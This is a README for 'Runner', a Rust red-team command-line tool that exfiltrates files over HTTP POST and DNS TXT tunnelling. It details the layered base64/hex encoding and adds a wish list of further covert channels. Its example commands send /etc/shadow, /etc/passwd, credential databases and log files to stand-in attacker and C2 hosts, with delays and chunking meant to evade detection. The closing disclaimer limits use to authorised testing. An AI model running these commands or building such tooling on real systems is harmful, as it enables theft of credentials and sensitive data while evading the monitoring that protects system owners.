# Runner - Data Exfiltration Tool

## Main Objective

**Runner** is a specialized Red Team tool designed to facilitate data exfiltration during security assessments and authorized penetration testing engagements. The tool provides stealthy data extraction capabilities through multiple covert channels, encoding sensitive files into base64-encoded chunks and transmitting them via HTTP or DNS protocols to evade detection mechanisms.

## Commands Available

### Global Command Structure
```
runner <OPERATION> <EXFILTRATION_TYPE> [OPTIONS]
```

### Operations

#### 1. Exfiltration via HTTP

Exfiltrate files using HTTP POST requests.

**Command:**
```bash
runner exfil http --src-files <FILE1>,<FILE2>,... -u <URL> [OPTIONS]
```

**Arguments:**
- `--src-files`: Comma-separated list of file paths to exfiltrate (required)
- `-u, --url`: Destination URL endpoint (required)
- `--delay`: Delay between chunk transmissions in milliseconds (default: 500ms, minimum: 50ms)
- `--chunks`: Number of chunks to split each file into (default: 10, minimum: 1)

**Example:**
```bash
runner exfil http --src-files /path/to/secrets.txt,/path/to/creds.db -u https://attacker.com/receive --delay 1000 --chunks 20
```

**Behavior:**
- Reads each specified file
- Encodes file content using base64 and hex encoding
- Splits encoded content into specified number of chunks
- Sends each chunk via HTTP POST with `Content-Type: text/plain`
- Applies configurable delay between transmissions

#### 2. Exfiltration via DNS

Exfiltrate a file using DNS TXT record queries (DNS tunneling).

**Command:**
```bash
runner exfil dns -f <FILE> -d <DOMAIN> [OPTIONS]
```

**Arguments:**
- `-f, --src-file`: File path to exfiltrate (required)
- `-d, --dest`: Destination domain name (required)
- `--delay`: Delay between DNS queries in milliseconds (default: 500ms)
- `-p, --protocol`: DNS protocol to use - `tcp` or `udp` (default: udp)
- `-n, --nameserver`: Custom nameserver address (default: 127.0.0.1:53)

**Example:**
```bash
runner exfil dns -f /etc/passwd -d exfil.attacker.com --delay 800 -p tcp -n 8.8.8.8:53
```

**Behavior:**
- Reads the specified file
- Computes optimal chunk size based on DNS domain length constraints (max 255 chars, labels max 63 chars)
- Encodes file content using DNS-safe base64 and hex encoding
- Sends DNS TXT queries with encoded chunks as subdomain labels
- Applies configurable delay between queries
- Supports both TCP and UDP DNS protocols

## Base64 Encoding Structure

### HTTP Payload Structure

The HTTP exfiltration uses a nested encoding scheme:

1. **File Content Encoding:**
   - Original file content → Base64 encode → Hex encode → Result string

2. **Chunk Structure:**
   ```
   <filename>:<chunk_index>:<encoded_content>
   ```
   - Last chunk is marked with `:end` suffix

3. **Chunk Encoding:**
   - Each chunk string → Base64 encode → Hex encode
   - Final payload sent in POST body as plain text

**Decoding Process (Receiver Side):**
```
Received chunk → Hex decode → Base64 decode → Parse "filename:index:content"
→ Extract content → Hex decode → Base64 decode → Original file data
```

### DNS Payload Structure

The DNS exfiltration uses a DNS-safe encoding optimized for domain name constraints:

1. **Chunk Size Calculation:**
   - Computes optimal chunk size based on:
     - Domain name max length: 255 characters
     - DNS label max length: 63 characters
     - Base64 encoding ratio: 4/3 expansion

2. **Payload Structure:**
   ```
   <filename>:<chunk_index>:<hex(base64(file_chunk))>
   ```
   - Last chunk includes `:end` marker

3. **DNS Query Format:**
   ```
   <hex(base64(payload_chunk))>.<destination_domain>
   ```
   - Payload is split into DNS-safe labels (dots separate labels)
   - Each label respects 63-character limit
   - Full domain respects 255-character limit

**Decoding Process (DNS Server Side):**
```
DNS query subdomain → Extract labels → Hex decode → Base64 decode
→ Parse "filename:index:content" → Hex decode → Base64 decode → Original file data
```

## Installation

### Prerequisites
- Rust 1.70+ (2021 edition)

### Build from Source
```bash
git clone <repository-url>
cd runner
cargo build --release
```

The compiled binary will be located at `target/release/runner`.

## Usage Examples

### Scenario 1: Exfiltrate Multiple Files via HTTP
```bash
runner exfil http \
  --src-files /tmp/credentials.txt,/var/log/sensitive.log \
  -u https://c2server.com/upload \
  --delay 2000 \
  --chunks 15
```

### Scenario 2: Exfiltrate via DNS over TCP
```bash
runner exfil dns \
  -f /etc/shadow \
  -d data.malicious.com \
  -p tcp \
  -n 192.168.1.100:53 \
  --delay 1500
```

### Scenario 3: Fast HTTP Exfiltration (Low Stealth)
```bash
runner exfil http \
  --src-files database.sql \
  -u http://10.0.0.50:8080/receive \
  --delay 50 \
  --chunks 5
```

## TODO List

### High Priority
- [ ] **Add Compression Options** - Implement gzip/zlib compression before encoding to reduce payload size
- [ ] **Add Encryption Options** - Implement AES/ChaCha20 encryption for payload confidentiality
- [ ] **Add Logging Options** - Structured logging for operational tracking and debugging
- [ ] **Add Retry Mechanisms** - Automatic retry on transmission failures with exponential backoff
- [ ] **Add Progress Indicators** - Real-time progress bars and transmission statistics

### Medium Priority
- [ ] **Add Different Exfiltration Methods**:
  - ICMP tunneling (ping exfiltration)
  - SMTP (email-based exfiltration)
  - FTP/SFTP
  - WebSocket channels
  - Cloud storage APIs (S3, GCS, Azure Blob)
- [ ] **Add Scheduling Support** - Cron-like scheduling for timed exfiltration
- [ ] **Add Shuffle Option** - Randomize chunk transmission order to evade pattern detection
- [ ] **Add Random delay** - Introduce random in delay intervals between payload chunks

### Low Priority
- [ ] Add steganography support (hide data in images/audio)
- [ ] Add multi-threaded transmission
- [ ] Add bandwidth throttling options
- [ ] Add custom header support for HTTP exfiltration
- [ ] Add authentication mechanisms (API keys, OAuth tokens)
- [ ] Add exfiltration via social media platforms (Discord, Telegram bots)
- [ ] Add exfiltration via file sharing services (Dropbox, Google Drive)

## Security Considerations

**WARNING:** This tool is designed for authorized security testing only. Unauthorized use of this tool for data exfiltration is illegal and unethical. Always obtain proper authorization before using this tool in any engagement.
